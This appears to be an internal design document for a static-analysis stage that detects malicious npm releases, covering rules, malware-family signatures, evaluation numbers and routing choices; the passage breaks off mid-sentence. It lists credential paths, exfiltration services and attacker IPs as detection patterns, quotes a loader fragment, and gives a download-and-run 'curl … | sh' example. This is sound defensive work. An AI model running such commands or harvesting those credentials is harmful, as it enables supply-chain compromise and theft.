# Stage 2: Static diff heuristics

> **Status:** running in the pipeline (2026-10-27). `kitsunox collect` runs it every hour, and
> `kitsunox static <run_id>` runs it on a triaged run. Routing: [0008](../decisions/0008-stage2-routing-and-tarball-capture.md).

## Purpose

Look at the code that a release actually adds, cheaply: regular expressions and simple
statistics over **new file contents only**. It catches what metadata can't, e.g. a payload that
runs when the package is imported (42% of first-release DataDog shape-B samples have no
metadata signal). Parsing JS properly is Stage 3.

## Usage

```sh
uv run kitsunox triage <run_id>    # Stage 1: writes batches.jsonl
uv run kitsunox static <run_id>    # Stage 2: fetches tarballs, writes static.jsonl + static-snapshot.json
uv run kitsunox eval run <dataset> --predictor pipeline   # end to end: what the pipeline flags
```

## Input and output

- **Input:** `PackageBatch` from Stage 1 (every version of one package in a run, plus the base).
  Stage 1 routes a package here if it is flagged, watched, new, has an install hook, its
  declared unpacked size grew by 64 KiB or more, or (since 2026-11-08) it is an update of at
  most 64 KiB (see [Routing](#routing-what-stage-2-reads)).
- **Fetch:** each version's tarball and the base's tarball, via `Ecosystem.fetch_artifact`
  (integrity-verified, extracted in memory by `extract_tar_gz`, never executed). Versions that
  declare more than 16 MB unpacked (`MAX_ARTIFACT_BYTES`) are not fetched, or more than 32 MB
  if the version declares an install hook (`MAX_HOOK_ARTIFACT_BYTES`, `fetch_limit`; since
  2026-11-08). Stages 3 and 4 fetch through the same `ArtifactFiles`. Tarballs go into
  `data/blobs` (immutable, so each is downloaded once) and are recorded in the run's
  `static-snapshot.json`.
- **Unavailable files** (too large, fetch or integrity failure, no artifact): the version gets
  no Stage 2 findings, and its decision says why (`files unavailable: ...`). An unavailable base
  counts as empty, so every file is new; the decision notes it (`base unavailable: ...`).
- **New contents:** every file content (by SHA-256) that is in some version of the batch but
  not in the base. Each is analysed once, and its findings are attributed to the first version
  that contained it. A version that adds malicious code and is reverted within the burst is
  still analysed.
- **Not new, or never run** (2026-10-30, `static.content_matches`): a changed file is matched
  whole, so its old matches would fire again every release (a Telegram bot's
  `api.telegram.org/bot`, an obfuscated commercial build, in every version). A match the base
  version's file at the same path already had (same rule, same explanation with numbers
  aside) is LOW, weight 1, and says "Also in the previous version's file". A bundler's
  content-hashed chunk gets a new name whenever its content changes, so it is compared with
  the base's chunks of the same name without the hash (`dist/registry-BX6j2lnF.mjs` with
  `dist/registry-CFQBxtE2.mjs`; `static.BaseFiles`; every base chunk of that name since 2026-10-31, worked out once per name: esbuild calls all its chunks `chunk-<HASH>.js`, and the first four rarely held the match, so `@wirecat/*` CLIs' bundled ngrok region table was HIGH in each release): a doc comment naming
  `*.trycloudflare.com` in `@camstack/*` addons was HIGH again on every release. Vite's
  8-character hash may have no digit and may contain `-` or `_` (`settings-panel-Bkki_GMk.js`,
  `-CnQC9-zc.js`); since 2026-10-31 such a suffix counts as a hash when it doesn't read as a
  word (a digit, `_` or `-`, or a capital past the first letter). Before, `glimmervoid`'s
  settings panel was a "new" file, HIGH, in about 25 queued releases. A file with no
  counterpart at all (a chunk renamed in a way `unhashed` can't see, such as Bun's
  `chunk-eevqxagd.js`; code moved to a new path or a versioned directory) is compared, since
  2026-10-31, with what any of the base's code files matched (`BaseFiles.anywhere`; docs,
  types, source maps and tests don't count) and says "Also in another of the previous
  version's files". A file with a counterpart is still compared with that counterpart only.
  On `vm-day1` this cost one malicious sample (`esoftplay@0.0.248`, which moved its Telegram
  code into new files; 8 other releases of the family are still reported); in the live queue
  about 27 of 46 exfil-endpoint reports with a base had the literal in another base file. A match
  only in a file that never runs (`NON_EXECUTING`: README and other docs, `.md`, `.d.ts`,
  source maps, `docs/`, `examples/`, `test/`; since round 5 also test-named files,
  `TEST_FILES`: `*.test.js`, `*.spec.ts`, `*.stories.tsx`, `__mocks__/`, `test_*.py`,
  `*_test.go`) is LOW as well, unless the version's install hooks or entry points load it
  (`LoadedFiles`: npm's `install_sources` and `load_sources`), since round 5; at first only for
  `exfil-endpoint`, for every rule since the second pass (no malicious `vm-day1` sample lost;
  `@atairo/qixi` was MEDIUM for an IP in a bundled dependency's README). Findings
  are kept, so a reviewer still sees them and they still add to the score. On `vm-day1` it
  cost 8 malicious samples, all follow-on releases of a series whose first malicious release is
  still reported (`esoftplay@0.0.142-m`, then 0.0.152 and others with the same Telegram
  exfiltration), for 3 benign.
- **Output:** the batch's candidates with Stage 2 findings and a `StageDecision`. A batch is
  forwarded if any finding is MEDIUM or above.

## Content cache

Rules only see a file's content, so their result is a pure function of
**(content SHA-256, rule ids and versions)**. Results are cached on disk under
`data/cache/static/<rules fingerprint>/`. A file already analysed in any earlier version or
package costs a hash lookup. Changing any rule's version changes the fingerprint, so nothing
stale is reused. Findings are stored without the path, and the path is added when they are
attributed.

## Rules (first set, ecosystem-agnostic, `rules/static.py`)

| Rule | Looks for | Severity |
|---|---|---|
| `static.exfil-endpoint` (v9) | Discord webhooks with a 17-20-digit id, Slack webhooks with `T…/B…` ids (not placeholders such as `123/abc`, `xxx/xxx` or `T00000000`), Telegram bot API, pastebins, request bins, OAST and tunnelling hosts; not a written Telegram placeholder (v4) or a deny list of 3+ services (v5); LOW (weight 1) for a tunnel host with a placeholder label or a host in a list of domains (v6), and for core-js's cited paste `pastebin.com/N21QzeQA`, a host pattern `*.host`, an entry of a newline/tab/comma-separated domain list and an OAST host with a placeholder label (v7); in a file that collects nothing to send (no machine identity, environment dump, directory walk or upload, process, credential store or token literal), also for a Telegram bot API URL with a handed token (`bot${config.token}`), a `webhook.site` mention with no bin id near it and a tunnel's bare suffix or `api.trycloudflare.com` (v8); a `trycloudflare.com` host that is not a quick tunnel's name (`demo.`, `api.`, `a.b.`, `abc-def.`), `pastebin.com/` with no paste or API after it, an ellipsis label, a `/bot,` list entry, a list of three services' names, and a URL written as a UI placeholder or example (`placeholder:`, `example:`, `e.g.`), anywhere (v9) | HIGH |
| `static.webhook-placeholder` | Discord/Slack webhook URLs whose id is a placeholder (`/services/xxx/xxx`, `/webhooks/123/abc`, `T00000000`): what v2 matched and v3 doesn't call an endpoint | MEDIUM (weight 3) |
| `static.encoded-url` | a whole string literal that is an `http(s)://` or `ws(s)://` URL in base64 (standard or URL-safe) or hex, e.g. `"aHR0cHM6Ly9..."`; the finding shows the decoded URL | MEDIUM (weight 3) |
| `static.function-require` (v2) | a function compiled from a string with `require` as its first parameter: `new Function("require", body)`, also via `Function.constructor`; LOW (weight 1) for a module wrapper (`"require", "module", "exports", code`) in a file that neither fetches nor decodes anything (v2) | MEDIUM (weight 3) |
| `static.sensitive-path` | `.npmrc`, `.ssh/id_*`, `.aws/credentials`, `.git-credentials`, shell history, browser credential stores, crypto wallets | LOW (v2; was MEDIUM) |
| `static.env-harvest` | the whole of `process.env` serialised or enumerated | LOW (v2; was MEDIUM) |
| `static.hardcoded-ip` (v6) | URLs with a public IPv4 literal, other than well-known public DNS resolvers (`1.1.1.1`, `8.8.8.8`, ...: connectivity checks; 29 of 56 live MEDIUM findings, none of 159 malicious); LOW in markup, tables, lockfiles, notices and `*.test.js` files and in `package.json`'s own repository/homepage/bugs URLs (v3); AliDNS, DNSPod and 114DNS count as resolvers, and example addresses (`1.2.3.4`, `123.45.67.89`, `93.184.216.34`, ...) are LOW (v4); LOW on a comment line (`//`, `# `, a block comment, `<!--`; v5); LOW as a UI placeholder or example value (`placeholder: '…'`, `# e.g. http://…`; v6) | MEDIUM |
| `static.encoded-blob` | base64 or hex runs ≥ 200 characters (excluding image and font data URIs) | LOW (v2; was MEDIUM) |
| `static.dynamic-code` | `eval(`, `new Function(`, `vm.runIn*` (excluding the common `Function("return this")` polyfill) | LOW (v2; was MEDIUM) |
| `static.obfuscated` (v2) | many `_0x`-style identifiers (javascript-obfuscator output); LOW (weight 1) in Emscripten glue with fewer than 100 such names and no obfuscator string array (v2) | MEDIUM |
| `static.npm-publish` | npm token use or `npm publish` from code (worm behaviour). Stage 3's `npm.publish-at-load` (MEDIUM) reports the command when it runs at load or install | LOW (v2; was MEDIUM) |
| `static.process-exec` | `child_process` | LOW |
| `static.network` | `http`, `https`, `net`, `dns`, `dgram` modules | LOW |
| `static.shell-startup` (2026-11-08) | writes to shell start-up files (`~/.bashrc`, `~/.zshrc`, `~/.profile`, fish's `config.fish`, the PowerShell profile). Forms: `hook` (an install hook in `package.json` appends to one), `inject` (code that writes files holds a line sourcing a file under `$HOME`, or a prompt that runs a command: `setopt prompt_subst`, `PROMPT="$(...)"`), `shell` (a shell command elsewhere appends to one), `code` (a start-up file's name, a file write within 1,000 characters and a home-directory reference) | MEDIUM (weight 3) for `hook` and `inject`; LOW for `shell` and `code` |
| `static.padded-code` (v2, 2026-11-10, `rules/padding.py`) | code pushed off screen: on one line, a run of 100+ spaces or tabs, then 200+ characters of code (not a comment, table cell or markup, not inside a string, with code punctuation, or shell code: a chained command or a pipe into a shell, v2); a run that is the line's indentation counts only when it is 100+ deeper than the line before's. One finding per file; [below](#code-hidden-behind-whitespace-staticpadded-code-2026-11-10) | MEDIUM (weight 3) |
| `static.channel-follow` (2026-11-08) | a WhatsApp library (Baileys fork) following channels with the user's account: a FOLLOW query or `newsletterFollow(...)` call outside the library's own follow method, in a file that also names channels (`...@newsletter`, `0029V...` invite codes, also in base64 or char codes), fetches them, or calls it an auto-follow/auto-join; not behind an `if (... === true)` opt-in. Never demoted as "not new" | MEDIUM (weight 3), "unwanted" |
| `static.channel-tagging` (2026-11-09) | a WhatsApp library (Baileys fork) tagging the user's messages with a channel: a fixed `...@newsletter` JID written as `newsletterJid` in a file that builds the forwarded-newsletter context (`forwardedNewsletterMessageInfo`). Never demoted as "not new"; [below](#whatsapp-channel-tagging-staticchannel-tagging-2026-11-09) | MEDIUM (weight 3), "unwanted" |

### Known-family signatures (`static.known-signature`, `rules/signatures.py`, 2026-11-01)

A repost of malware we have already confirmed should be known on arrival, not rediscovered: the
tavern LLM-credential stealer came back three times under new names and scored 5-6 each time,
from `static.obfuscated` alone. Each signature is taken from our own malicious verdicts (never
from a takedown or an outside list, decision 0016) and names them: a family's endpoints,
accounts and wallets, or strings its payload always carries. It fires (HIGH, weight 6) when all
of its patterns match the file's text plus the strings its obfuscation hides
(`decoded_strings`: one-byte-XOR base64 string tables, javascript-obfuscator's base64 arrays in
files with its `_0x` identifiers, and plain base64 literals of 16+ characters). Unlike other
Stage 2 matches (but like `static.channel-follow`) it is never demoted as "also in the previous version" (`static.ALWAYS_NEW`); a
match only in documentation, types or tests is still demoted. `SIGNATURES_VERSION` is the
rule's version, so changing the set changes the rules fingerprint (and Stage 2's cache).

| Id | Family | Matches on | Taken from |
|---|---|---|---|
| KX-0001 | tavern LLM-credential stealer | `/create-foundation-model-agreement`, `AWSInvoicingService.ListInvoiceSummaries` and `Action=GetCallerIdentity&...` together (decoded) | `tavern-ai-sdk`, `char-ai-sdk`, `character-ai-sdk`, `persona-ai-sdk` |
| KX-0002 | the same family's TRON wallets | two addresses | the same |
| KX-0003 | `claims-*` install-time recon | `GamerD11/ping_test` | `claims-acct-unlock`, `claims-ac1` |
| KX-0004 | depconf probe (user, host, directory) | `38.242.235.206` | `internal-renderers`, `ms-client-portal`, `pandafortunerush` |
| KX-0005 | notsemz probes | their webhook.site token, `130.162.231.177` | `@pcb-dp/qa-commons`, `ssite-mock-server` |
| KX-0006 | probe authors' out-of-band beacon ids | an interactsh and a Burp Collaborator id | `@mobile-platform/magnetic-components`, `dependencykfeg` |
| KX-0007 | `calculator-preinstall-hook-demo`'s Discord webhook | its webhook id | `calculator-preinstall-hook-demo@1.1.2` |
| KX-0008 | ~~Baileys forks following hard-coded channels~~ retired 2026-11-08 (signatures v3): `static.channel-follow` | a `...@newsletter` id, `FOLLOW` and `newsletterWMexQuery` in one file | `@chatbridgeworld/baileys`, `kevinx-baileys`, `@bil-rgb/baileys` |
| KX-0009 | ~~Baileys forks fetching their channel list~~ retired 2026-11-08 (signatures v3): `static.channel-follow` | `noxXza/data`, `push-saurus.yorunime.sbs` | `luna-baileys`, `sauruspro-bail` |
| KX-0010 | Discord webhook of the cutekitten/bigdevin55 crypto-name squats | its webhook id | `sol-wallet-adapter`, `wallet-adapter-base`, `contracts-upgradeable` |
| KX-0011 | ~~Baileys fork fetching a hidden channel list~~ retired 2026-11-08 (signatures v3): `static.channel-follow` | `mmhdzaidie-dev/idch` (base64 in the source) | `@zaiilx/baileys`, `@zaidevx/baileys` |

Measured on 2026-11-01 over every captured tarball with a verdict and every 18th other captured
tarball (6,004): each family's captured malicious versions match (KX-0001 and KX-0002: 4 of 4,
KX-0003: 4, KX-0004: 6, KX-0005 and KX-0006: 2 each, KX-0008: 1; the other Baileys forks
weren't captured), no benign (814) or inconclusive (26) version matches except
`calculator-preinstall-hook-demo@1.1.1`, the benign predecessor that posts fixed text to the same
webhook, and among the others only `dependencykfeg@25.1.9`, a release of the `weqwe` probe family
the pipeline never reported. No file took over 5 s. The upstream Baileys API
(`newsletterFollow` calling `newsletterWMexQuery(jid, FOLLOW)`) doesn't match KX-0008: it has no
channel id of its own.

**Baileys signatures retired** (signatures v3, 2026-11-08). KX-0008, KX-0009 and KX-0011 said
HIGH "Matches a known malware family" for forks that make the user's WhatsApp account follow
the author's channels, which the owner has since ruled *unwanted*, not malware (decision 0015
addenda). `static.channel-follow` (MEDIUM, weight 3, "unwanted", also in `ALWAYS_NEW`, below)
matches every version they match, in a file Stage 2 doesn't demote:

| Set | Tarballs | A KX-0008/0009/0011 match | ... also `channel-follow` (not demoted) | Only the signatures |
|---|---|---|---|---|
| Baileys corpus + every verdict with a captured tarball | 1,522 | 16 | 16 | 0 |
| live, every tarball of the eight unpruned runs (2026-11-07/08) | 35,544 | 2 | 2 | 0 |
| `vm-day1` (all 4,944 samples; the 316 Baileys-like ones scanned) | 316 | 1 (`@zaidevx/baileys@1.0.3`, benign-labelled) | 1 | 0 |

Relabelling them MEDIUM "unwanted" would have duplicated `channel-follow`'s finding on the same
file, so they were retired instead: no version that is reported today stops being reported
(each still has `channel-follow`'s MEDIUM finding); such a fork's score drops by the signature's
6 and its severity from HIGH to MEDIUM, so it sorts lower in the queue, and the report no longer
calls a channel follow malware. The ids stay reserved (`RETIRED`).

KX-0010 and KX-0011 (signatures v2, 2026-11-02) were measured the same way over 887 versions
with a verdict and every Nth other captured tarball (3,045): each matches its captured family
members (3 and 1), and no unreviewed tarball. KX-0011 also matched `@zaidevx/baileys@1.0.3`,
which had a benign verdict from 2026-10-30, before the Baileys policy: it is the same code as
`@zaiilx/baileys` (same author), and the verdict was re-recorded malicious.

Adding one: take the family's endpoints or the strings every sample decodes to (not decoy
padding, not a library's), add the verdicts to `seen_in`, bump `SIGNATURES_VERSION`, and measure
again over the captured tarballs before deploying.

### Metadata vs. tarball (npm, `ecosystems/npm/rules/artifact.py`)

These rules see a version's registry metadata and its whole extracted tarball (the
`ArtifactRule` contract in `core/rules.py`). The npm registry doesn't check that the two agree
("manifest confusion"), and Stage 1 only reads the metadata:

| Rule | Looks for | Severity |
|---|---|---|
| `npm.artifact.hidden-install-script` | an install hook in the tarball's `package.json` that the metadata lacks or shows differently (`npm install` runs the tarball's) | HIGH |
| `npm.artifact.size-mismatch` | files total more than `dist.unpackedSize` by over 1 KiB and 1% (understated only: overstating gains an attacker nothing) | MEDIUM |

On 1,069 live versions (run `20261028T004851Z-npm`), declared and real size matched exactly
every time, and no tarball hid an install hook. The 9 script differences were npm's own
normalisation (a stripped `node_modules/.bin/` prefix; `install: node-gyp rebuild` added to
the metadata for `binding.gyp` packages; a default `start`), which the rule ignores. The file
count differed in 17 versions with identical sizes, so it is not used.

On `day1` (all samples, files decrypted in memory): neither rule fired on any of 1,468 benign
samples, and `hidden-install-script` fired on no malicious one either. A two-sided size check
fired on 236 malicious samples, mostly shape-A follow-ons, but every one was *overstated*
(e.g. `@tushar-br/desktop`: 47 MB declared, 13 KB in the zip). That is files missing from the
dataset's zips, not attacker behaviour, and it is why only understatement is flagged. Neither
rule can be validated on DataDog data: they guard against evasions the dataset doesn't contain.
Their cost, measured on benign traffic, is zero.

**Limit:** these rules only see what Stage 2 downloads. An update that understates its growth
below 64 KiB while staying over 64 KiB declared is never routed here, so the size check
catches a lie only on routed versions (watched, new, flagged, hooked, grown or small). Closing that would need a size signal that doesn't
come from the publisher, e.g. the tarball's `Content-Length`. That is an open item.

Five rules started at MEDIUM and were downgraded to LOW after the first evaluation, because
on their own they fire about as often on benign releases as on malicious ones (numbers in the
comment on each rule in `rules/static.py`). LOW findings are still recorded as evidence and
are inputs for combination scoring in Stage 4; they just don't forward on their own.

## Evaluation

- **Malicious:** the DataDog samples. Package files come from the encrypted zip, decrypted in
  memory only. The base for shape A is the previous version's tarball from npm (benign
  versions usually still exist). If it is gone, all files count as new, and those samples are
  counted.
- **Benign:** the dataset's benign samples; the new and base tarballs come from npm and are
  cached immutably under `data/eval/tarballs/`.
- **Predictors:** `stage2-rules` (Stage 2 alone) and `stage1+2-rules` (either stage flags).
  Recall on follow-on releases stays in its own cell.

## Results

Dataset `day1` (sha256 `d99626981ae6`): 1,500 benign samples from our runs, 3,444 DataDog
samples. A sample is forwarded if any new file content has a finding at MEDIUM or above.

| Predictor | A | A follow-on | B | B follow-on | Benign pass-through (weighted) |
|---|---|---|---|---|---|
| `stage2-rules`, first set (2 MB file cap) | 19.5% | 31.0% | 74.4% | 67.7% | 11.5% |
| `stage2-rules`, tuned (16 MB cap, five rules → LOW) | **71.5%** | 84.0% | **49.9%** | 50.7% | **1.0%** |
| `stage1-rules` (for reference) | 80.1% | 2.7% | 58.2% | 21.7% | 0.6% |
| `stage1+2-rules`: either stage, tuned | **91.4%** | 85.4% | **66.1%** | 55.6% | **1.5%** |

What changed between the first and the tuned run:

- **The 2 MB file cap hid most shape-A payloads.** 698 of 965 shape-A samples had a new file
  over 2 MB. In many attacks the payload is appended to the package's existing (large, bundled)
  main file. At 16 MB, A recall went from 19.5% to 71.5%. Shai-Hulud's payload is about 10 MB.
- **Five rules were too noisy at MEDIUM.** `npm-publish` alone fired on 6.4% / 8.0% of benign
  A / B releases (release tooling mentions `NPM_TOKEN`). Downgrading the five took benign
  pass-through from 11.5% to 1.0%, and cost B recall (74.4% → 49.9%): many first-release
  payloads show only those signals.
- **Stage 2 catches many follow-ons that Stage 1 can't, mostly by accident.** A follow-on's
  metadata often matches the previous (also malicious) release, so Stage 1 sees nothing
  (2.7%). Stage 2 gets 84.0%, but mainly because the malicious base has been taken down, so
  every file counts as new. In live collection the base would still be there, and an
  unchanged payload would not be new content. Treat the follow-on numbers as optimistic.

Data gaps, counted per sample: the base tarball was gone from npm for 1,542 samples (all
files counted as new; mostly follow-ons, whose malicious base was taken down), and the
sample's own files were unavailable for 32 (not forwarded).

### Routing: what Stage 2 reads

`stage1+2-rules` above assumes Stage 2 reads every release, which is about 114k tarballs a
day. Behind the original Stage 1 gate (rules or watched), almost everything only Stage 2
catches was dropped first. The user chose a hybrid. The details came from simulating routings
on the saved per-sample results, and are recorded in
[0008](../decisions/0008-stage2-routing-and-tarball-capture.md):

- every **new package** (cheap: 4k a day, 0.2 GB);
- every **update whose declared unpacked size grew by ≥ 64 KiB** (71% of malicious updates,
  8.3% of benign). Routing *small* updates instead added nothing: payloads make packages bigger
  (on 2026-11-08 small updates were routed as well, for rules that catch small payloads: see
  [below](#routing-vs-live-recall-and-the-hook-cap-2026-11-08));
- watched and flagged packages, as before;
- **no version over 16 MB declared** (9% of releases, 86% of bytes, mostly binaries).

End to end (`pipeline` predictor: flagged by Stage 1 rules, or routed to Stage 2 and flagged
there), measured on `day1`:

| | A | A follow-on | B | B follow-on | Benign (weighted) |
|---|---|---|---|---|---|
| Stage 1 rules alone | 80.1% | 2.7% | 58.2% | 21.7% | 0.6% |
| Old gate (simulated) | 83.5% | 18.9% | 58.2% | 21.8% | 1.0% |
| **`pipeline` (hybrid)** | **86.0%** | 38.0% | **66.0%** | 22.5% | **0.9%** |
| **`pipeline`, `exfil-endpoint` v2** | **86.0%** | 38.0% | **66.0%** | 22.5% | **0.7%** |
| Upper bound: Stage 2 reads everything | 91.4% | 85.4% | 66.1% | 55.6% | 1.5% |

The simulation predicted the `pipeline` numbers exactly. Stage 1's routing passes 25.8% of
releases to Stage 2 (weighted; `stage1` predictor), about 24k versions a day after the cap.

### Routing vs. live recall, and the hook cap (2026-11-08)

Of the 100 live OSV misses ([prospective-labeling](../proposals/prospective-labeling.md)), 35
updates were never routed and 13 had no files (12 over the cap). The 24 of them still on the
registry, replayed through Stages 2–3 with no cap: **none reported**. They are missed by the
rules (shell start-up file persistence, a WhatsApp fork's channel auto-follow, an IP kill
switch), not by the routing. No routing rule was added: the cheapest one (updates ≤ 64 KiB,
18.7k versions a day, 0 of 451 benign samples reported) catches nothing today's rules flag,
live or in DataDog's first releases. Details and options:
[stage2-routing-recall](../proposals/stage2-routing-recall.md).

What changed is the cap for versions that **declare an install hook: 32 MB** instead of 16.
On `vm-day1`, Stage 2 then reads 44 more malicious shape-A follow-ons (of 97 over 16 MB, all
hooked, all flagged by `stage2-rules`), 1 first release and 2 B follow-ons. Live (2026-11-02):
339 more versions a day (173 routed for their hook, 160 watched, 6 flagged), ~2.5 GB of new
tarballs a day (up to 4.8 GB with bases; today's total is 17.7 GB), and on a sample of 111 of
them, 2 reported (1.8%, both `npm.install-script-changed`), about 6 benign reports a day.

Later the same day the owner approved routing small updates too, once the two rules below
existed: Stage 1 now forwards every update of at most 64 KiB declared (`triage.md` reason 6),
~16,200 versions and ~0.14 GB of tarballs a day; 2 of a 1/10 sample of 4 days (6,436) were
reported, both look benign; on `vm-day1` it adds 62 B follow-ons that today's rules flag
([prefreeze-recall](../proposals/prefreeze-recall.md#3-small-updates-to-stage-2)).

### WhatsApp channel follows (`static.channel-follow`, 2026-11-08)

Baileys forks that make the user's WhatsApp account follow (and mute) the author's channels
were 11 of the 48 live misses Stage 2 had no files for, and the signature KX-0008 only matched
the forms it was taken from (`newsletterWMexQuery` with a plain id): `kevinx-baileys` and
`@sakataa/baileys` hide the ids in base64 and call `mexQuery(..., QueryIds.FOLLOW, ...)`,
`@gopyr/baileys` resolves `0029V...` invite codes, `felicia-baileys` builds the method name and
ids from char codes, the `luna-baileys` copies fetch a list. The rule looks for what they share:
a FOLLOW query (or `newsletterFollow(...)` call) outside the library's own follow method, in a
file that names, hides or fetches channels or calls the code an auto-follow. A follow behind
`if (<...follow...> === true)` is opt-in and doesn't count. The owner's policy (decision 0015
addenda, 2026-11-08): following channels with the user's account is **unwanted**, hidden or
disclosed, unless there is evidence of malware; opt-in is benign. So the finding is MEDIUM
(weight 3: a fork that does it is reported) and says "unwanted", not malware. It is never
demoted as "not new" (`ALWAYS_NEW`): every release of such a fork follows again (`@sakataa/baileys@2.0.0`, a
live miss, changed the file but its base already followed: reported only with `ALWAYS_NEW`).

Measured on every Baileys-like package with a verdict and a tarball (the registry, or a
captured blob), whole package:

| Verdict (at the time) | Versions | `channel-follow` | KX-0008/0009/0011 |
|---|---|---|---|
| malicious (now unwanted: hidden auto-follow) | 26 (20 packages) | **26** | 14 |
| inconclusive (now unwanted: disclosed or default-on) | 6 | 4 (the 4 that follow; not `hyrox`, `baileys-linius`) | 1 |
| benign (API only, opt-in, or other WhatsApp tools) | 23 | 1: `@yshtxxproject/baileys@0.0.1` | 0 |

`@yshtxxproject/baileys@0.0.1` follows three hard-coded channels on first connect by default,
the same code as `@dancihuy/baileys@0.0.1` (ruled malicious, then unwanted); its benign verdict
predates the policy (an owner question). `shadowx-baileys` (opt-in, `=== true`) and upstream
Baileys' API don't match. Live, over what Stage 2 read in the runs `20261107T163310Z`, `20261107T222723Z` and
`20261108T073127Z` (4.6 days): it newly reports 11 versions, all forks that follow channels by
default (`charape` 1.0.15-1.0.19, `@ruthless-imperium/baileys` 1.0.1-1.0.3 on `open`,
`vamtzy-baileys` and two name variants with `autoJoinChannels !== false`), about 2.4 a day:
unwanted under the headline reading, none malware. A gap: an opt-in set in *another* file is
not seen (`lexzymods-baileys` and three name variants, reviewed benign: the option is read in
`lib/Socket/index.js`, the bundled list followed in `lib/Utils/repan-channels.js`).

### WhatsApp channel tagging (`static.channel-tagging`, 2026-11-09)

The owner's ruling of 2026-11-09 (decision 0015, "Baileys media tagging"): a fork that attaches
the author's channel (newsletter) annotation to the messages the user sends, without following
anything, is covert channel promotion, **unwanted** like an auto-follow
(`@codexverified/baileys` 2.19.18 and 2.19.19: `lib/Utils/channel-policy.js` writes
`newsletterJid: process.env.NEWSLETTER_ID || '120363402922206865@newsletter'` into the
`ForwardedNewsletterMessageInfo` of every image or video upload). No rule named it: the two
versions were reported only because the Node-version check their `preinstall` runs had changed
(`npm.install-script-changed`), which round 4's v5 of that rule makes LOW. The rule fires on a
file that writes a fixed `\d{15,22}@newsletter` JID as `newsletterJid` (also as the fallback of
a variable) and builds the forwarded-newsletter context (`forwardedNewsletterMessageInfo`).
Upstream Baileys defines the protobuf field and takes the caller's JID, so it doesn't match.
MEDIUM, weight 3, "unwanted", never demoted as "not new" (`ALWAYS_NEW`), as
`static.channel-follow`. Measured on every verdicted version's whole tarball in
[precision-round4-A](../proposals/precision-round4-A.md).

### Shell start-up files (`static.shell-startup`, 2026-11-08)

`@atedone/workspace-context` (14 live versions, never reported) writes a managed block that
sources a file under the home directory into `~/.zshrc`/`~/.bashrc`, and later sets
`setopt prompt_subst` with `PROMPT="$(node ...)"`, the prompt rendered from a server's reply.
Writing start-up files is also what completion and PATH installers do, so the rule
(`static.shell-startup`) has four forms with their own severity:

| Form | What | Severity | Live, 4.6 days of Stage 2 reads (newly reported) |
|---|---|---|---|
| `hook` | an install hook in `package.json` appends to a start-up file | MEDIUM 3 | 0 |
| `inject` | a file that writes files and refers to `HOME` sets a command-running prompt under `prompt_subst`, or (next to a start-up file's name) holds a line sourcing a non-start-up file under `$HOME` | MEDIUM 3 | 1 (`@heyvamz/carry@0.4.3`, a completion installer) |
| `shell` | a shell redirect into a start-up file anywhere else | LOW 1 | ~8 a day if MEDIUM (`backupd`, `westkite`, `@ohos-ports/*`) |
| `code` | a start-up file's name, a file write within 1,000 characters and `HOME` | LOW 1 | ~2 a day if MEDIUM |

"Live" is every version Stage 2 read in the three runs above whose captured tarball has a
match (1,421 versions; 190,203 of 201,475 tarballs were still on disk to scan), replayed with
its base and its recorded Stage 1-4 findings through Stage 4's `decide`. A first `inject` that
counted sourcing a start-up file itself (`. "$HOME/.profile"` in remote-session scripts,
"run `source ~/.zshrc`" advice) and any `PROMPT=` variable (an AI prompt passed through a
shell script) newly reported at least 11 benign versions and was narrowed. `@atedone` 0.0.12
and 0.0.18 are reported (both need small updates routed, `triage.md` reason 6); its other
releases repeat the previous version's match and are LOW. No reviewed version of any kind is
reported by the MEDIUM forms that wasn't reported already; DataDog `vm-day1` has no sample it
changes.

### Code hidden behind whitespace (`static.padded-code`, 2026-11-10)

`hauntview@0.2.9` (live, malicious) added one line to `scripts/postinstall.mjs` and the same
line to `dist/cli.js`: 266 tabs, then a 12,433-character obfuscated loader (an Ethereum
blockscout lookup for its C2 address, an XOR-decoded download, `eval`, a detached `node -i`).
No other Stage 2 rule matched it: `Function` is reached as `d[p.substring(0,11)]` (no literal
`eval` or `Function`), the obfuscator writes no `_0x` names, and its shuffled strings are full of
punctuation, so `encoded-blob` never matches. Only `npm.install-script-changed` reported it.

The rule (`rules/padding.py`, MEDIUM, weight 3, one finding per file) asks for a run of 100 or
more spaces or tabs on a line, then 200 or more characters of code on the same line. Not
counted: a tail that opens a comment, a table cell or markup (`//`, `/*`, `*`, `#`, `|`, `<`);
a run inside a string (an odd count of one quote kind before it); a tail without code
punctuation; a run that is the line's indentation and is less than 100 deeper than the line
before's (generated nested code grows a level at a time: `@motir/cli`'s compiled schema
validators are 106 spaces deep). The snippet shows the run as a counted marker
(`⟨266 tabs⟩var z = '-c';...`), so a reviewer sees the code. Install files are covered at
Stage 3 by `npm.install-script-code` v3 (round 4, agent A) with the same 100-character run;
this rule is what sees the line in a file no hook runs (`dist/cli.js`, an entry point, a file
loaded at `require`).

Thresholds from data (`docs/proposals/precision-round4-F.md`): over the files Stage 2 reads in
the 3,716 verdicted live versions, with the run then code in an executable file and not a
comment, table or string, no benign version has a run over 88 characters, and no benign
version has a run of 60 or more followed by 100 or more characters (the nearest:
`@helmcms/checkout`, 68 spaces, JSX). Every benign hit at 100/200 is a Markdown table or a
source map (documentation, LOW anyway). The malicious hits are `hauntview@0.2.9` (266 tabs)
and three samples of one family with 2,000 spaces before `_0x` code (`persona-ai-sdk`,
`ai-persona-sdk`, `archetype-index-sdk`, also `static.obfuscated`).

Measured with the real code (round 4 F):

- **Live replay** (3,716 verdicted versions, `main` vs. this rule): reported 1,674 → 1,674, 0
  benign newly reported, 0 positive or unverified lost; it fires only on the three persona
  samples (already reported). On the 27 versions verdicted since, `hauntview@0.2.9` gains
  it in both files (score 6 → 9); its nine benign versions get nothing.
- **One day of everything Stage 2 read** (24 runs, 49,733 versions, reviewed or not): MEDIUM
  only on `hauntview@0.2.9`; LOW (documentation) on two source maps and a `GUIDE.md` table.
- **`vm-day1`**: +17 malicious samples reported that nothing else reports (2,708 → 2,725 of
  3,444 at round4-base), 15 of them the `@gluestack-ui`/`@react-native-aria` compromise, whose
  `lib/commonjs/index.js` ends an ordinary line with 526-1,441 spaces and then a
  3,426-character loader (`global['_V']='8-npm29';global['r']=require;(function(){...`), and
  `emittery-up@1.8.2` and `tailwindcss-animate-ui@1.0.0` (149-152 tabs, same loader).
  None of the 1,500 benign samples has the shape (1,046 with files read; 9 have a run of 80+
  then 100+ characters, none 100/200).

v2 (2026-11-10, round 4 G, [precision-round4-G](../proposals/precision-round4-G.md)): shell
code is code too. "Code punctuation" asked for `(` or `=`, which `; curl -s https://x/p | sh`
